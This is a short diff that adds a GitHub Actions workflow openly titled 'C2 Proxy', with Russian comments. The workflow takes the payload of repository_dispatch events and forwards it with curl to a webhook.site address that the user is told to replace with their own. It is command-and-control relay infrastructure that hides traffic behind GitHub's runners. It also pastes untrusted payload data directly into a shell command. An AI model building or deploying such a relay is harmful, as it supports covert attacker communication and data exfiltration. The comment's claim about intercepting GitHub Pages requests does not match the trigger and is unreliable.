@@ -1,0 +1,20 @@
+# .github/workflows/proxy.yml
+name: C2 Proxy
+
+on:
+  # Запускается при каждом запросе к API GitHub Pages
+  # Это позволяет нам перехватывать POST-запросы
+  repository_dispatch:
+    types: [webhook]
+
+jobs:
+  proxy:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Forward request to Webhook.site
+        # Используем curl для пересылки запроса на webhook.site
+        run: |
+          curl -X POST \
+               -H "Content-Type: application/json" \
+               -d '${{ github.event.client_payload }}' \
+               "https://webhook.site/bf294d9a-8153-41c4-af0e-f6cc32619700" # <-- ЗАМЕНИТЕ НА ВАШ URL
